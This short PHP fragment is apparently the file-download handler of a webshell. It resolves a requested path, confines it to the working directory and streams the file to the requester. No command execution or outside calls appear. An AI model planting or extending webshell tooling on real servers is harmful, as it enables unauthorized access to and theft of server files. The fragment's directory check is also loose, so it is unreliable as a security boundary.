<?php
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (!is_string($file) || $file === '') {
        http_response_code(400);
        exit;
    }
    $real = realpath($file);
    if ($real === false || !is_file($real) || !is_readable($real)) {
        http_response_code(404);
        exit;
    }
    // Confine downloads to the webshell's working directory tree.
    $root = realpath(getcwd() ?: '.');
    if ($root === false || strpos($real, $root) !== 0) {
        http_response_code(403);
        exit;
    }
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . str_replace(['"', "\r", "\n"], '', basename($real)) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($real));
    readfile($real);
    exit;
}
